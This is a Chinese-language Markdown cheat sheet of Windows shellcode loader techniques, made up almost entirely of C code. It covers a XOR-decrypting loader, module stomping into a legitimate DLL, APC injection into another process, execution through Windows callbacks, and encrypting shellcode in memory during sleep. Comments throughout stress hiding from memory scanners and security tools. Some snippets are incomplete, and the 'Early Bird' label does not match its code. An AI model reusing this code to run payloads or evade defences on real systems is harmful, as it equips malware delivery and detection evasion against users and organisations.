# Shellcode 加载器技术

## 基础加载器

### C 语言实现
```c
#include <windows.h>
#include <stdio.h>

// XOR 解密 + VirtualAlloc + 执行
// 用法: loader.exe <encrypted_shellcode_file> <xor_key_byte>

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <file> <xor_key>\n", argv[0]);
        return 1;
    }

    // 读取加密 shellcode
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, fileSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // XOR 解密
    BYTE key = (BYTE)strtoul(argv[2], NULL, 16);
    for (DWORD i = 0; i < fileSize; i++) {
        buf[i] ^= key;
    }

    // 改为可执行
    DWORD oldProtect;
    VirtualProtect(buf, fileSize, PAGE_EXECUTE_READ, &oldProtect);

    // 执行
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    VirtualFree(buf, 0, MEM_RELEASE);
    return 0;
}
```

## 模块 Stomping

```c
// 将 shellcode 注入到合法 DLL 的内存空间
// 这样进程内存中看到的是合法 DLL，而非未备份的 shellcode

void ModuleStomp(BYTE* shellcode, SIZE_T size) {
    // 1. 加载一个合法的 DLL
    HMODULE hModule = LoadLibraryA("xpsservices.dll");

    // 2. 找到 DLL 的 .text 段（可执行）
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)
        ((BYTE*)hModule + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)
        ((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Characteristics & 0x20000000) { // IMAGE_SCN_MEM_EXECUTE
            BYTE* textBase = (BYTE*)hModule + sections[i].VirtualAddress;
            SIZE_T textSize = sections[i].Misc.VirtualSize;

            if (textSize >= size) {
                DWORD oldProtect;
                VirtualProtect(textBase, size,
                    PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(textBase, shellcode, size);
                VirtualProtect(textBase, size,
                    PAGE_EXECUTE_READ, &oldProtect);

                // 执行
                HANDLE hThread = CreateThread(NULL, 0,
                    (LPTHREAD_START_ROUTINE)textBase,
                    NULL, 0, NULL);
                WaitForSingleObject(hThread, INFINITE);
                break;
            }
        }
    }
}
```

## APC 注入 (Early Bird)

```c
// 在进程创建时（early bird）注入 APC
// 比 CreateRemoteThread 更隐蔽

void EarlyBirdApcInject(DWORD pid, BYTE* shellcode, SIZE_T size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    // 在目标进程分配内存
    LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteBuf, shellcode, size, NULL);

    // 枚举目标进程线程
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT,
                    FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)remoteBuf, hThread, 0);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    CloseHandle(hProcess);
}
```

## 回调执行

```c
// 使用合法 Windows 回调函数执行 shellcode
// 避免直接 CreateThread

void CallbackExec(BYTE* shellcode, SIZE_T size) {
    HANDLE hHeap = GetProcessHeap();
    BYTE* buf = (BYTE*)HeapAlloc(hHeap, 0, size);
    memcpy(buf, shellcode, size);

    DWORD oldProtect;
    VirtualProtect(buf, size, PAGE_EXECUTE_READ, &oldProtect);

    // 方法 1: EnumSystemLocalesA
    EnumSystemLocalesA((LOCALE_ENUMPROCA)buf, 0);

    // 方法 2: CreateTimerQueueTimer
    HANDLE hQueue = CreateTimerQueue();
    HANDLE hTimer;
    CreateTimerQueueTimer(&hTimer, hQueue,
        (WAITORTIMERCALLBACK)buf, NULL, 100, 0, 0);
    Sleep(200); // 等待回调执行

    // 方法 3: CertEnumSystemStore
    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER,
        NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)buf);

    HeapFree(hHeap, 0, buf);
}
```

## Sleep 加密 (内存规避)

```c
// 在 sleep 期间加密 shellcode 内存，规避内存扫描
void SecureSleep(DWORD ms) {
    DWORD oldProtect;
    // 加密
    VirtualProtect(shellcodeBase, shellcodeSize,
        PAGE_READWRITE, &oldProtect);
    for (SIZE_T i = 0; i < shellcodeSize; i++)
        shellcodeBase[i] ^= xorKey;

    Sleep(ms);

    // 解密
    for (SIZE_T i = 0; i < shellcodeSize; i++)
        shellcodeBase[i] ^= xorKey;
    VirtualProtect(shellcodeBase, shellcodeSize,
        PAGE_EXECUTE_READ, &oldProtect);
}
```
